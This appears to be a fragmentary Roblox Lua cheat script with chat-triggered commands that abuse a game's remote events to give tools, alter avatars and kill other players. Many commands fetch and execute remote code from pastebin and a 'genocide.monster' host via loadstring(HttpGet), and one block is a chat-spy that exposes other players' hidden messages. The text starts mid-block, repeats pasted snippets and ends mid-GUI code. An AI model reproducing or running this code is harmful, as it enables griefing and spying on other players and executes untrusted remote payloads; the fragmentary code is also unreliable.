MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Transparency","1")
    end
    if msg:lower() == "^arms" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Transparency","1")
    end
    if msg:lower() == "^legs" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Transparency","1")
    end
    if msg:lower() == "^head" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud") -- YOUR GAMEPASS


local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","1")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"]:Remove())
    end
    if msg:lower() == "^bbat" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/zq4TYFG1"))()
    end
	if msg:lower() == "^ambulance" then 
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/Zg7dnb5K"))()
    end
    if msg:lower() == "^badnoob" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/tB0He0HJ"))()
	end
    if msg:lower() == "^ak" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/EK2yyybY"))()
    end
    if msg:lower() == "^cool" then        
		while wait() do
	    game.Workspace.GuiEvent:FireServer("Speed.") 
            wait(0.5)
	    game.Workspace.GuiEvent:FireServer("Speed..") 
            wait(0.5)
            game.Workspace.GuiEvent:FireServer("Speed...") 
            wait(0.5)
            game.Workspace.GuiEvent:FireServer("Speed....") 
            wait(0.5)
	    end
	end
	if msg:lower() == "unknown" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Material",Enum.Material.ForceField)
	end
	if msg:lower() == "unknown" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Material",Enum.Material.ForceField)
	end
	if msg:lower() == "unknown" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Material",Enum.Material.ForceField)
	end
	if msg:lower() == "unknown" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Material",Enum.Material.ForceField)
	end
	if msg:lower() == "^ff" then
                game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud") 
local UserName  = game:GetService("Players").LocalPlayer.Name
local Autoride = true 
local Name, ToolTip = "KTOOL", "Bodymesh" 
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"), 
    players = game:GetService("Players") 
}
local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 

CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Material",Enum.Material.ForceField)
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Material",Enum.Material.ForceField)
	end
    if msg:lower() == "^viplnvalid" then
local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
while wait() do
	CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font","Cartoon")
	CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","NOTVIP")
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255,0,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(75,0,130))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(255,165,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0,0,255))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,128,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0,128,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,0,255))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255,165,0))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(75,0,130))
    wait(.0000000000000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255,0,0))
    wait(.0000000000000000001)
    end
end
    if msg:lower() == "^acp" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/bHD8YmrD"))()
    end
    if msg:lower() == "^fat" then
game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Shape","Badll")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Size",Vector3.new(2,2,2))
CE:FireEvent("PompousTheCloud",MainUserW["Shirt"],"ShirtTemplate","rbxassetid://249458025")
CE:FireEvent("PompousTheCloud",MainUserW["Pants"],"PantsTemplate","rbxassetid://280452751")
    end
    if msg:lower() == "^infyl" then
        loadstring(game:HttpGet("https://pastebin.com/raw/tzTXmYf2"))()
    end
    if msg:lower() == "^inf" then
        loadstring(game:HttpGet("https://pastebin.com/raw/0k6w9XPQ"))()
    end
    if msg:lower() == "notvalid" then
        loadstring(game:HttpGet(('http://genocide.monster/script_source'),true))()
    end
    if msg:lower() == "^couch" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/MLmdLvaH"))()
    end
        if msg:lower() == "^noob" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/aUnrfhmy"))()
    end
        if msg:lower() == "^pm" then
        --This script reveals ALL hidden messages in the default chat
--chat "/spy" to toggle!
enabled = false
--if true will check your messages too
spyOnMyself = true
--if true will chat the logs publicly (fun, risky)
public = false
--if true will use /me to stand out
publicItalics = true
--customize private logs
privateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
--////////////////////////////////////////////////////////////////
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
    end    
        if msg:lower() == "^dom" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/m2BMpbG4"))()
    end
if string.sub(msg,1,6) == ("lnvalid")then
    while true do 
        for i = 0,1,0.1 do 
            game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new(Color3.fromHSV(i,1,1)))    
            wait(.1)
        end    
    end
end
if string.sub(msg,1,2) == ("re")then
    game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(15)
end
if string.sub(msg,1,3) == ("'rj")then
game:GetService("TeleportService"):Teleport(game.PlaceId, 
game:GetService("Players").LocalPlayer)
end
local gamepassId = IDFORSPAWNER

local RobloxianLife = loadstring(game:HttpGetAsync("https://pastebin.com/raw/HTF0vRHF"))()
local CommandApi = loadstring(game:HttpGetAsync("https://pastebin.com/raw/3mHL7pKv"))()
local players = game:GetService("Players")
local localPlayer = players.localPlayer

RobloxianLife:Initialize(gamepassId)

local function strStarts(String,Start)
    return string.sub(String,1,string.len(Start))==Start
end

local function getPlayerByName(name)
    local plrs = {}

    if name == "me" then
        table.insert(plrs, localPlayer)
        return plrs
    elseif name == "others" then
        for i,v in pairs(players:GetPlayers()) do
            if v.Name ~= localPlayer.Name then
                table.insert(plrs, v)
            end
        end
        return plrs
    elseif name == "all" then
        for i,v in pairs(players:GetPlayers()) do
            table.insert(plrs, v)
        end
        return plrs
    elseif name == "random" then
        table.insert(plrs, players:GetPlayers()[math.random(1, #players:GetPlayers())])
        return plrs
    end

    for i,v in pairs(players:GetPlayers()) do
        if strStarts(v.Name, name) then
            table.insert(plrs, v)
        end
    end
    return plrs
end

CommandApi:AddCommand("lnvalid", function(name)
    for i,v in pairs(getPlayerByName(name)) do
        RobloxianLife:SetLocalProperty(localPlayer.Character.Humanoid, "HipHeight", 0.1)
        RobloxianLife:SetLocalProperty(localPlayer.Character.Humanoid.RootPart.RootJoint, "Part1", v.Character:FindFirstChild'Torso' and v.Character.Torso or v.Character.LowerTorso)
    end
end)

CommandApi:AddCommand("lnvalid", function(mult) 
    mult = tonumber(mult)
    if not mult then return end

    local function multiplycf(cf, m)
        return CFrame.new(cf.p*m)*CFrame.fromOrientation(cf:ToOrientation())
    end

    for i,v in pairs(localPlayer.Character:GetDescendants()) do
        if v:isA"BasePart" then
            RobloxianLife:SetLocalProperty(v,"Size", v.Size*mult)
        elseif v:isA"Motor6D" then
            RobloxianLife:SetLocalProperty(v,"C0", multiplycf(v.C0, mult))
            RobloxianLife:SetLocalProperty(v,"C1", multiplycf(v.C1, mult))
        end
    end
end)

 local chatConnection = localPlayer.Chatted:Connect(CommandApi.OnChatted)

end)
-- ///////////////////////////////////////////////////////////////////////////////////////////|||||||||||||||
-- quick note! anything beyond this do not touch at all or else you will break the script     |||||||||||||||
-- i'll add notes to the things you can change/ not permited                                  |||||||||||||||    Prefix Script Made By YandZ#8406
-- ///////////////////////////////////////////////////////////////////////////////////////////|||||||||||||||
a=7602040
prefix = "^"
lplayer = game.Players.LocalPlayer
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)

function GetPlayer(String)
    local Found = {}
    local strl = String:lower()
    if strl == "all" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= lplayer.Name then
                table.insert(Found,v)
            end
        end   
    elseif strl == "me" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name == lplayer.Name then
                table.insert(Found,v)
            end
        end  
    else
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                table.insert(Found,v)
            end
        end    
    end
    return Found    
end
if string.sub(msg,1,6)==prefix.."goto " then
for i, v in pairs(GetPlayer(string.sub(msg, 7))) do
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame    
end
end;

if string.sub(msg,1,7)==prefix.."lkill "then 
for f,g in pairs(GetPlayer(string.sub(msg,8)))do 
local C=game:GetService('Players').LocalPlayer.Name
local D={}
local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
function D:FireEvent(H,I,J,K)G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})end
_G.lkill=true
while _G.lkill do 
game.Workspace.GiveTool:FireServer(a,"PompousTheCloud")F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
game.Players.LocalPlayer.Character.PompousTheCloud:Remove()wait(1)
end 
end 
end;

if string.sub(msg,1,6)==prefix.."kill "then
game.workspace.GiveTool:FireServer("7602040", "PompousTheCloud") 
for f,g in pairs(GetPlayer(string.sub(msg,7)))do 
local C=game:GetService('Players').LocalPlayer.Name;
local D={}
local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
function D:FireEvent(H,I,J,K)
G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
end;
game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
end 
end
end)
end)

randomscript.Name = "randomscript"
randomscript.Parent = MainGUI
randomscript.BackgroundColor3 = Color3.fromRGB(53, 53, 255)
randomscript.BackgroundTransparency = 1.000
randomscript.BorderColor3 = Color3.fromRGB(255, 0, 0)
randomscript.Position = UDim2.new(0.543735206, 0, 0.365384668, 0)
randomscript.Size = UDim2.new(0, 159, 0, 32)
randomscript.Font = Enum.Font.SourceSans
randomscript.Text = "Coming Soon..."
randomscript.TextColor3 = Color3.fromRGB(0, 0, 0)
randomscript.TextScaled = true
randomscript.TextSize = 14.000
randomscript.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
randomscript.TextStrokeTransparency = 0.000
randomscript.TextWrapped = true
randomscript.MouseButton1Click:connect(function()
	-- script goes here
end)

gamegui.Name = "gamegui"
gamegui.Parent = MainGUI
gamegui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
gamegui.BackgroundTransparency = 1.000
gamegui.BorderColor3 = Color3.fromRGB(255, 255, 0)
gamegui.Position = UDim2.new(0.543735206, 0, 0.206730783, 0)
gamegui.Size = UDim2.new(0, 159, 0, 32)
gamegui.Font = Enum.Font.SourceSans
gamegui.Text = "Many Game GUI"
gamegui.TextColor3 = Color3.fromRGB(0, 0, 0)
gamegui.TextScaled = true
gamegui.TextSize = 14.000
gamegui.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
gamegui.TextStrokeTransparency = 0.000
gamegui.TextWrapped = true
gamegui.MouseButton1Click:connect(function()
	-- script goes here
end)

randomscript2.Name = "randomscript2"
randomscript2.Parent = MainGUI
randomscript2.BackgroundColor3 = Color3.fromRGB(53, 53, 255)
randomscript2.BackgroundTransparency = 1.000
randomscript2.BorderColor3 = Color3.fromRGB(255, 0, 0)
randomscript2.Position = UDim2.new(0.0638297945, 0, 0.497596145, 0)
randomscript2.Size = UDim2.new(0, 159, 0, 32)
randomscript2.Font = Enum.Font.SourceSans
randomscript2.Text = "Coming Soon..."
randomscript2.TextColor3 = Color3.fromRGB(0, 0, 0)
randomscript2.TextScaled = true
randomscript2.TextSize = 14.000
randomscript2.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
randomscript2.TextStrokeTransparency = 0.000
randomscript2.TextWrapped = true
randomscript2.MouseButton1Click:connect(function()
	-- script goes here
end)

randomscript_2.Name = "randomscript"
randomscript_2.Parent = MainGUI
randomscript_2.BackgroundColor3 = Color3.fromRGB(53, 53, 255)
randomscript_2.BackgroundTransparency = 1.000
randomscript_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
randomscript_2.Position = UDim2.new(0.543735206, 0, 0.497596204, 0)
randomscript_2.Size = UDim2.new(0, 159, 0, 32)
randomscript_2.Font = Enum.Font.SourceSans
randomscript_2.Text = "Coming Soon..."
randomscript_2.TextColor3 = Color3.fromRGB(0, 0, 0)
randomscript_2.TextScaled = true
randomscript_2.TextSize = 14.000
randomscript_2.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
randomscript_2.TextStrokeTransparency = 0.000
randomscript_2.TextWrapped = true
randomscript_2.MouseButton1Click:connect(function()
	-- script goes here
end)

randomscript5.Name = "randomscript5"
randomscript5.Parent = MainGUI
randomscript5.BackgroundColor3 = Color3.fromRGB(53, 53, 255)
randomscript5.BackgroundTransparency = 1.000
randomscript5.BorderColor3 = Color3.fromRGB(255, 0, 0)
randomscript5.Position = UDim2.new(0.0638297945, 0, 0.629807711, 0)
randomscript5.Size = UDim2.new(0, 159, 0, 32)
randomscript5.Font = Enum.Font.SourceSans
randomscript5.Text = "Coming Soon..."
randomscript5.TextColor3 = Color3.fromRGB(0, 0, 0)
randomscript5.TextScaled = true
randomscript5.TextSize = 14.000
randomscript5.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
randomscript5.TextStrokeTransparency = 0.000
randomscript5.TextWrapped = true
randomscript5.MouseButton1Click:connect(function()
	-- script goes here
end)

randomscript3.Name = "randomscript3"
randomscript3.Parent = MainGUI
randomscript3.BackgroundColor3 = Color3.fromRGB(53, 53, 255)
randomscript3.BackgroundTransparency = 1.000
randomscript3.BorderColor3 = Color3.fromRGB(255, 0, 0)
randomscript3.Position = UDim2.new(0.543735206, 0, 0.62980777, 0)
randomscript3.Size = UDim2.new(0, 159, 0, 32)
randomscript3.Font = Enum.Font.SourceSans
randomscript3.Text = "Coming Soon..."
randomscript3.TextColor3 = Color3.fromRGB(0, 0, 0)
randomscript3.TextScaled = true
randomscript3.TextSize = 14.000
randomscript3.TextStrokeColor3 = Color3.fromRGB(255, 0, 255)
randomscript3.TextStrokeTransparency = 0.000
randomscript3.TextWrapped = true
randomscript3.MouseButton1Click:connect(function()
	-- script goes here
end)

randomscript6.Name = "randomscript6"
randomscript6.Parent = MainGUI
randomscript6.BackgroundColor3 = Color3.fromRGB(53, 53, 255)
randomscript6.BackgroundTransparency = 1.000
randomscript6.BorderColor3 = Color3.fromRGB(255, 0, 0)
randomscript6.Position = UDim2.new(0.0638297945, 0, 0.783653855, 0)
randomscript6.Size = UDim2.new(0, 159, 0, 32)
randomscript6.Font = Enum.Font.SourceSans
randomscript6.Text = "Coming Soon..."
randomscript6.TextColor3 = Color3.fromRGB(0, 0, 0)
